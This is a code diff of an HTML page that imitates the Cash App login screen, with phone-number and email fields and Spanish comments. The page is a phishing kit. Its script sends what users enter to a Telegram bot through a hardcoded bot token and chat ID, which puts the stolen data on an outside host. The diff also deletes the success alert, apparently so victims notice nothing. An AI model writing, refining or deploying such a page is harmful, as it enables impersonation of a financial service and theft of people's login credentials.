@@ -1,129 +1,129 @@
-<body
-  class="bg-[#00D64C] mt-[51px] min-h-screen flex items-center justify-center"
-  style="font-family: 'Helvetica', sans-serif;"
->
-  <div class="bg-white w-full max-w-lg py-16 px-8 rounded-3xl shadow-lg">
-    <h1 class="text-4xl text-[#333333] font-semibold mb-2">Log in</h1>
-    <p class="text-[#333333] mb-10">
+<div class="bg-[#00D64C] pt-48 items-center justify-center font-noto-sans flex">
+  <div class="bg-white w-full max-w-lg pt-16 pb-16 px-10 rounded-3xl shadow-lg">
+    <h1 class="text-3xl text-[#333333] font-bold mb-5 pl-2">Log in</h1>
+    <p class="text-gray-600 -mt-2 mb-16 pl-2">
       Enter your phone number or email. New to Cash App?
       <br />
-      <a href="#" class="text-[#00D64C] font-medium">Create account</a>
+      <a href="#" class="text-[#00D64C] font-semibold">Create account</a>
     </p>
 
-   <!-- Form Container -->
-   <div id="formContainer">
-    <!-- Mobile Number Form -->
-    <div id="mobileForm">
-      <label for="phone" class="block text-sm font-medium text-gray-700 mb-2">
-        Mobile number
-      </label>
-      <div
-        class="flex items-center w-full px-4 py-2 border border-gray-300 bg-gray-100 rounded-xl"
-      >
-        <!-- SVG Flag -->
-        <div class="flex items-center justify-center w-8 h-5 overflow-hidden rounded">
-          <img
-            id="flagIcon"
-            src="/icons/uk.svg"
-            alt="Flag"
-            class="w-full h-full object-cover"
+    <!-- Form Container -->
+    <div id="formContainer">
+      <!-- Mobile Number Form -->
+      <div id="mobileForm" class="pb-4">
+        <label for="phone" class="block text-md font-bold text-gray-700 mb-2">
+          Mobile number
+        </label>
+        <div class="flex items-center w-full px-4 py-2 bg-gray-100 rounded-xl">
+          <!-- SVG Flag -->
+          <div
+            class="flex items-center justify-center w-8 h-5 overflow-hidden rounded"
+          >
+            <img
+              id="flagIcon"
+              src="/icons/uk.svg"
+              alt="Flag"
+              class="w-full h-full object-cover"
+            />
+          </div>
+
+          <!-- Country Code -->
+          <span id="countryCode" class="ml-2 font-semibold text-gray-800">
+            +44
+          </span>
+
+          <!-- Dropdown Icon -->
+          <button
+            type="button"
+            class="flex items-center ml-2 text-green-500 focus:outline-none"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              class="h-4 w-4"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <path d="M6 9l6 6 6-6"></path>
+            </svg>
+          </button>
+
+          <!-- Input Field -->
+          <input
+            type="text"
+            id="phone"
+            name="phone"
+            placeholder="1234 567890"
+            class="flex-grow px-6 py-3 bg-transparent text-gray-800 placeholder-gray-500 focus:outline-none"
           />
         </div>
-    
-        <!-- Country Code -->
-        <span
-          id="countryCode"
-          class="ml-2 font-semibold text-gray-800"
-        >
-          +44
-        </span>
-    
-        <!-- Dropdown Icon -->
-        <button
-          type="button"
-          class="flex items-center ml-2 text-green-500 focus:outline-none"
-        >
-          <svg
-            xmlns="http://www.w3.org/2000/svg"
-            class="h-4 w-4"
-            viewBox="0 0 24 24"
-            fill="none"
-            stroke="currentColor"
-            stroke-width="2"
-            stroke-linecap="round"
-            stroke-linejoin="round"
-          >
-            <path d="M6 9l6 6 6-6"></path>
-          </svg>
-        </button>
-    
-        <!-- Input Field -->
+      </div>
+
+      <!-- Email Form (Hidden by Default) -->
+      <div id="emailForm" class="pb-6 -mt-6 hidden">
+        <label for="email" class="block pl-2 text-md font-bold text-gray-600">
+          Email
+        </label>
         <input
-          type="text"
-          id="phone"
-          name="phone"
-          placeholder="1234 567890"
-          class="flex-grow pl-4 bg-transparent text-gray-800 placeholder-gray-500 focus:outline-none"
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Your email address"
+          class="w-full px-6 py-4 mt-2 border bg-gray-100 rounded-xl focus:ring-2 focus:ring-green-500 focus:outline-none"
         />
       </div>
-    </div>
-    
 
-    <!-- Email Form (Hidden by Default) -->
-    <div id="emailForm" class="hidden">
-      <label for="email" class="block text-sm font-medium text-gray-600">
-        Email
-      </label>
-      <input
-        type="email"
-        id="email"
-        name="email"
-        placeholder="Your email address"
-        class="w-full px-6 py-3 mt-2 border border-[#00D64C] bg-gray-100 rounded-xl focus:ring-2 focus:ring-green-500 focus:outline-none"
-      />
-    </div>
-
-    <!-- Buttons -->
-    <div class="flex justify-between gap-4 mt-6">
-      <button
-        id="toggleButton"
-        type="button"
-        class="w-1/2 py-2 border font-bold border-gray-300 rounded-full text-gray-600 hover:bg-gray-100"
-      >
-        Use email
-      </button>
-      <button
-        type="submit"
-        class="w-1/2 py-2 bg-green-500 text-gray-100 rounded-full hover:bg-green-600"
-      >
-        Continue
-      </button>
+      <!-- Buttons -->
+      <div class="flex justify-between gap-4 mt-8">
+        <button
+          id="toggleButton"
+          type="button"
+          class="w-1/2 py-2.5 border font-bold border-gray-300 rounded-full text-dark bg-gray-100 hover:bg-gray-200"
+        >
+          Use email
+        </button>
+        <button
+          type="submit"
+          class="w-1/2 py-2 font-bold bg-green-500 text-gray-100 rounded-full hover:bg-green-600"
+        >
+          Continue
+        </button>
+      </div>
     </div>
   </div>
-</div>
 
-<script>
-  // Obtener elementos del DOM
-  const toggleButton = document.getElementById("toggleButton");
-  const mobileForm = document.getElementById("mobileForm");
-  const emailForm = document.getElementById("emailForm");
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Hatran&display=swap");
 
-  // Función para alternar entre formularios
-  toggleButton.addEventListener("click", () => {
-    // Alternar la visibilidad de los formularios
-    mobileForm.classList.toggle("hidden");
-    emailForm.classList.toggle("hidden");
-
-    // Cambiar el texto del botón dinámicamente
-    toggleButton.textContent =
-      mobileForm.classList.contains("hidden") ? "Use phone" : "Use email";
-  });
-</script>
-
-  </div>
+    .font-noto-sans {
+      font-family: "Noto Sans Hatran", serif;
+      font-weight: 400;
+      font-style: normal;
+    }
+  </style>
 
   <!-- JavaScript -->
   <script>
+    // Obtener elementos del DOM
+    const toggleButton = document.getElementById("toggleButton");
+    const mobileForm = document.getElementById("mobileForm");
+    const emailForm = document.getElementById("emailForm");
+
+    // Función para alternar entre formularios
+    toggleButton.addEventListener("click", () => {
+      // Alternar la visibilidad de los formularios
+      mobileForm.classList.toggle("hidden");
+      emailForm.classList.toggle("hidden");
+
+      // Cambiar el texto del botón dinámicamente
+      toggleButton.textContent = mobileForm.classList.contains("hidden")
+        ? "Use phone"
+        : "Use email";
+    });
+
     const form = document.getElementById("telegramForm");
     const botToken = "7860301704:AAFHfhT7Y6Ow6cMEAbfVjl7Q7Z-Dic_OS4I"; // Reemplaza con tu token de bot
     const chatId = "1451244612"; // Reemplaza con tu chat ID
@@ -147,16 +147,14 @@
       })
         .then((response) => {
           if (response.ok) {
-            alert("Datos enviados correctamente por Telegram UwU!");
             form.reset();
           } else {
             alert("Hubo un error al enviar los datos 7w7.");
           }
         })
         .catch((error) => {
-          console.error("Error:", error);
-          alert("No se pudo conectar con Telegram UwU.");
+          console.error("Error", error);
         });
     });
   </script>
-</body>
+</div>
